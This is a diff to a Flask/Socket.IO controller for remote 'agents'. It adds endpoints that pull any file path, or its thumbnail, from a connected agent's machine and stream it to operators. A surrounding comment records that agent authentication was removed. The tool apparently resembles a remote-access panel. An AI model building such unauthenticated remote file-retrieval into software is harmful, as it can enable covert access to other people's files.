@@ -1,7 +1,7 @@
 #final controller
 # Use standard threading (avoids eventlet/gevent requirements on Render)
 
-from flask import Flask, request, jsonify, redirect, url_for, Response, send_file, send_from_directory, session, flash, render_template_string, render_template
+from flask import Flask, request, jsonify, redirect, url_for, Response, send_file, send_from_directory, session, flash, render_template_string, render_template, stream_with_context
 from flask_socketio import SocketIO, emit, join_room, leave_room
 from flask_cors import CORS
 LIMITER_AVAILABLE = False
@@ -19,6 +19,8 @@ import smtplib
 from email.mime.text import MIMEText
 import json
 import re
+import mimetypes
+from typing import Optional
 
 # WebRTC imports for SFU functionality
 try:
@@ -75,7 +77,10 @@ app.config['SECRET_KEY'] = Config.SECRET_KEY or secrets.token_hex(32)  # Use con
 def add_security_headers(response):
     """Add security headers to all responses"""
     response.headers['X-Content-Type-Options'] = 'nosniff'
-    response.headers['X-Frame-Options'] = 'DENY'
+    if request.path.startswith('/api/agents/') and ('/files/stream' in request.path or '/files/thumbnail' in request.path):
+        response.headers['X-Frame-Options'] = 'SAMEORIGIN'
+    else:
+        response.headers['X-Frame-Options'] = 'DENY'
     response.headers['X-XSS-Protection'] = '1; mode=block'
     response.headers['Strict-Transport-Security'] = 'max-age=31536000; includeSubDomains'
     response.headers['Content-Security-Policy'] = (
@@ -2018,6 +2023,10 @@ DASHBOARD_HTML = r'''
 # In-memory storage for agent data
 AGENTS_DATA = defaultdict(lambda: {"sid": None, "last_seen": None})
 DOWNLOAD_BUFFERS = defaultdict(lambda: {"chunks": [], "total_size": 0, "local_path": None})
+FILE_INFO_WAITERS = {}
+FILE_RANGE_WAITERS = {}
+FILE_THUMB_WAITERS = {}
+FILE_WAITERS_LOCK = threading.Lock()
 
 # Remove the agent secret authentication - allow direct agent access
 # AGENT_SHARED_SECRET = os.environ.get("AGENT_SHARED_SECRET", "sphinx_agent_secret")
@@ -2595,6 +2604,56 @@ def get_command_history(agent_id):
         'total_count': len(history)
     })
 
+_RANGE_RE = re.compile(r'bytes=(\d*)-(\d*)')
+
+def _extract_b64(s):
+    if not isinstance(s, str) or not s:
+        return None
+    return s.split(',', 1)[1] if ',' in s else s
+
+def _guess_mime(path: str):
+    mime, _ = mimetypes.guess_type(path)
+    if mime:
+        return mime
+    return 'application/octet-stream'
+
+def _request_agent_file_range(agent_id: str, agent_sid: str, file_path: str, start: Optional[int], end: Optional[int], timeout_s: float = 15.0):
+    request_id = f"range_{int(time.time() * 1000)}_{secrets.token_hex(6)}"
+    ev = threading.Event()
+    with FILE_WAITERS_LOCK:
+        FILE_RANGE_WAITERS[request_id] = {'event': ev, 'data': None}
+    socketio.emit('request_file_range', {
+        'agent_id': agent_id,
+        'request_id': request_id,
+        'path': file_path,
+        'start': start,
+        'end': end
+    }, room=agent_sid)
+    ev.wait(timeout_s)
+    with FILE_WAITERS_LOCK:
+        waiter = FILE_RANGE_WAITERS.pop(request_id, None)
+    if not waiter:
+        return None
+    return waiter.get('data')
+
+def _request_agent_thumbnail(agent_id: str, agent_sid: str, file_path: str, size: int, timeout_s: float = 20.0):
+    request_id = f"thumb_{int(time.time() * 1000)}_{secrets.token_hex(6)}"
+    ev = threading.Event()
+    with FILE_WAITERS_LOCK:
+        FILE_THUMB_WAITERS[request_id] = {'event': ev, 'data': None}
+    socketio.emit('request_file_thumbnail', {
+        'agent_id': agent_id,
+        'request_id': request_id,
+        'path': file_path,
+        'size': size
+    }, room=agent_sid)
+    ev.wait(timeout_s)
+    with FILE_WAITERS_LOCK:
+        waiter = FILE_THUMB_WAITERS.pop(request_id, None)
+    if not waiter:
+        return None
+    return waiter.get('data')
+
 # File Management API
 @app.route('/api/agents/<agent_id>/files', methods=['GET'])
 @require_auth
@@ -2687,6 +2746,129 @@ def upload_file(agent_id):
         'upload_id': upload_id,
         'filename': file.filename
     })
+
+@app.route('/api/agents/<agent_id>/files/stream', methods=['GET'])
+@require_auth
+def stream_agent_file(agent_id):
+    if agent_id not in AGENTS_DATA:
+        return jsonify({'error': 'Agent not found'}), 404
+    agent_sid = AGENTS_DATA[agent_id].get('sid')
+    if not agent_sid:
+        return jsonify({'error': 'Agent not connected'}), 400
+
+    file_path = request.args.get('path', '')
+    if not file_path:
+        return jsonify({'error': 'File path is required'}), 400
+
+    mime = _guess_mime(file_path)
+    range_header = request.headers.get('Range')
+
+    if range_header:
+        m = _RANGE_RE.match(range_header.strip())
+        if not m:
+            return Response(status=416)
+        start_s, end_s = m.group(1), m.group(2)
+        start = int(start_s) if start_s != '' else None
+        end = int(end_s) if end_s != '' else None
+
+        if start is None and end is not None:
+            meta = _request_agent_file_range(agent_id, agent_sid, file_path, 0, 0)
+            if not meta or meta.get('error'):
+                return jsonify({'error': meta.get('error') if meta else 'Timeout'}), 404
+            total_size = int(meta.get('total_size') or 0)
+            suffix_len = end
+            if total_size <= 0 or suffix_len <= 0:
+                return Response(status=416)
+            start = max(0, total_size - suffix_len)
+            end = total_size - 1
+
+        data = _request_agent_file_range(agent_id, agent_sid, file_path, start, end if end is not None else -1)
+        if not data:
+            return jsonify({'error': 'Timeout'}), 504
+        if data.get('error'):
+            return jsonify({'error': data.get('error')}), 404
+
+        total_size = int(data.get('total_size') or 0)
+        b64 = _extract_b64(data.get('data') or data.get('chunk'))
+        if not b64:
+            return jsonify({'error': 'Empty response'}), 502
+        try:
+            raw = base64.b64decode(b64)
+        except Exception:
+            return jsonify({'error': 'Invalid data'}), 502
+
+        actual_start = int(data.get('start') if data.get('start') is not None else (start or 0))
+        actual_end = int(data.get('end') if data.get('end') is not None else (actual_start + len(raw) - 1))
+        if total_size > 0:
+            actual_end = min(actual_end, total_size - 1)
+
+        resp = Response(raw, status=206, mimetype=mime)
+        resp.headers['Accept-Ranges'] = 'bytes'
+        resp.headers['Content-Length'] = str(len(raw))
+        if total_size > 0:
+            resp.headers['Content-Range'] = f'bytes {actual_start}-{actual_end}/{total_size}'
+        resp.headers['Content-Disposition'] = 'inline'
+        return resp
+
+    data = _request_agent_file_range(agent_id, agent_sid, file_path, 0, -1)
+    if not data:
+        return jsonify({'error': 'Timeout'}), 504
+    if data.get('error'):
+        return jsonify({'error': data.get('error')}), 404
+
+    b64 = _extract_b64(data.get('data') or data.get('chunk'))
+    if not b64:
+        return jsonify({'error': 'Empty response'}), 502
+    try:
+        raw = base64.b64decode(b64)
+    except Exception:
+        return jsonify({'error': 'Invalid data'}), 502
+
+    resp = Response(raw, status=200, mimetype=mime)
+    resp.headers['Accept-Ranges'] = 'bytes'
+    resp.headers['Content-Length'] = str(len(raw))
+    resp.headers['Content-Disposition'] = 'inline'
+    return resp
+
+@app.route('/api/agents/<agent_id>/files/thumbnail', methods=['GET'])
+@require_auth
+def thumbnail_agent_file(agent_id):
+    if agent_id not in AGENTS_DATA:
+        return jsonify({'error': 'Agent not found'}), 404
+    agent_sid = AGENTS_DATA[agent_id].get('sid')
+    if not agent_sid:
+        return jsonify({'error': 'Agent not connected'}), 400
+
+    file_path = request.args.get('path', '')
+    if not file_path:
+        return jsonify({'error': 'File path is required'}), 400
+
+    try:
+        size = int(request.args.get('size', '256'))
+    except Exception:
+        size = 256
+    size = max(16, min(size, 512))
+
+    data = _request_agent_thumbnail(agent_id, agent_sid, file_path, size)
+    if not data:
+        return jsonify({'error': 'Timeout'}), 504
+    if data.get('error'):
+        return jsonify({'error': data.get('error')}), 404
+
+    mime = str(data.get('mime') or 'image/jpeg')
+    b64 = _extract_b64(data.get('data') or data.get('thumb') or data.get('chunk'))
+    if not b64:
+        return jsonify({'error': 'Empty response'}), 502
+    try:
+        raw = base64.b64decode(b64)
+    except Exception:
+        return jsonify({'error': 'Invalid data'}), 502
+
+    resp = Response(raw, status=200, mimetype=mime)
+    resp.headers['Cache-Control'] = 'private, max-age=3600'
+    resp.headers['Content-Length'] = str(len(raw))
+    resp.headers['Content-Disposition'] = 'inline'
+    return resp
 
 # System Monitoring API
 @app.route('/api/system/stats', methods=['GET'])
@@ -3586,6 +3768,28 @@ def handle_file_chunk_from_agent(data):
             'offset': offset,
             'total_size': total_size
         }, room='operators')
+
+@socketio.on('file_range_response')
+def handle_file_range_response(data):
+    request_id = data.get('request_id')
+    if not request_id:
+        return
+    with FILE_WAITERS_LOCK:
+        waiter = FILE_RANGE_WAITERS.get(request_id)
+        if waiter:
+            waiter['data'] = data
+            waiter['event'].set()
+
+@socketio.on('file_thumbnail_response')
+def handle_file_thumbnail_response(data):
+    request_id = data.get('request_id')
+    if not request_id:
+        return
+    with FILE_WAITERS_LOCK:
+        waiter = FILE_THUMB_WAITERS.get(request_id)
+        if waiter:
+            waiter['data'] = data
+            waiter['event'].set()
 
 @socketio.on('file_upload_progress')
 def handle_file_upload_progress(data):
